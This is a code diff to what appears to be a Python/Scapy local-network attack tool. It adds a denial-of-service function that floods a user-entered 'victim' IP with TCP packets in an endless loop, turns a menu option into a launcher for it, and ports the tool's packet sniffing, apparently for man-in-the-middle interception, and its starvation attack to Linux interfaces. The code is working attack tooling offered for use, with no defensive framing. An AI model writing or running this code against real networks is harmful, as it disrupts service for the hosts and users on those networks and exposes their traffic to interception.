@@ -7,7 +7,8 @@ import time
 import subprocess
 import socket
 
-self_ip = str(subprocess.check_output("ipconfig getifaddr en0", shell=True))[2:-3]
+
+self_ip = str(subprocess.check_output("echo $(ifconfig | grep '192.168') | cut -f 2 -d ' ' | cut -f 2 -d ':'", shell=True))[2:-3]
 lan = self_ip.split(".")
 lan = lan[0] + "." + lan[1] + "." + lan[2]
 nmap_broadcast = lan + ".1/24"
@@ -28,7 +29,7 @@ def get_hosts():
 	del arp_result[-1]
 	for host in arp_result:
 		host = host.split(" ")
-		if host[3] == "(incomplete)":
+		if host[3] == "<incomplete>":
 			continue
 		global hosts
 		hosts[host[1][1:-1]] = host[3]
@@ -80,6 +81,17 @@ def starvation_attack():
 def starvation_callback(pkt):
 	pkt.show()
 
+def dos_attack(target_ip):
+	#source_port = input("Enter a port number.")
+	i = 1
+	while True:
+		IP1 = IP(src = self_ip, dst = target_ip)
+		TCP1 = TCP(sport = 443, dport = 443)
+		pkt = IP1 / TCP1
+		send(pkt, inter = .001)
+		print ("packet sent ", i)
+		i = i + 1
+
 while 1:
 	print("select from below options")
 	print("1 get online hosts")
@@ -108,15 +120,25 @@ while 1:
 			sniff_filter = "ip host " + target_ip
 			print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
 			#packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
-			packets = sniff(iface="en0", prn=mitm_callback, filter="tcp", store=0)
+			packets = sniff(iface="wlp5s0", prn=mitm_callback, filter="tcp", store=0)
 			wrpcap(target_ip + "_capture.pcap", packets)
+
 	elif option == "3":
-		continue
+		target_ip = input("enter the ip of the victim \n")
+		if target_ip == self_ip:
+			print("cannot attack yourself")
+			print()
+			continue
+		else:
+			dos_thread = threading.Thread(target=dos_attack, args=(target_ip,))
+			dos_thread.start()
+			print(f"{target_ip} is under DoS attack.\n" )
+			
 	elif option == "4":
 		print("starvation attack starting")
 		starvation_thread = threading.Thread(target=starvation_attack)
 		starvation_thread.start()
-		packets = sniff(iface="en0", prn=starvation_callback, filter="udp", store=0)
+		packets = sniff(iface="wlp5s0", prn=starvation_callback, filter="udp", store=0)
 
 
 
